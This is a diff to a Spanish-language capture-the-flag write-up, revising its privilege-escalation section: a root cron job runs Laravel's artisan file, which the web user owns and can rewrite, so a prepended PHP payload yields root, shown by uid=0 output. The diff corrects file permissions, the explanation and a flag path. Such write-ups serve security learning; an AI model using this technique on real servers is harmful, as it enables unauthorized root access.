@@ -92,10 +92,10 @@ cat /etc/crontab; ls -l /var/www/laravel/artisan
 
 ```text
 * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
--rwxrwxrwx 1 www-data www-data 1339 artisan
+-rwxr-xr-x 1 www-data www-data 1646 artisan
 ```
 
-`artisan` es el punto de entrada de Laravel y está en `777`: se puede reescribir. Se le añade un payload al principio para que el cron de root lo ejecute cada minuto:
+`artisan` es el punto de entrada de Laravel y es propiedad de `www-data` (755): el usuario de la web puede reescribirlo. Se le añade un payload al principio para que el cron de root lo ejecute cada minuto:
 
 ```php
 <?php
@@ -115,7 +115,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ## Evidencia
 
 ```text
-/var/www/html/user.txt -> <user_flag>
+/home/noulis/user.txt -> <user_flag>
 /root/root.txt         -> <root_flag>
 ```
 
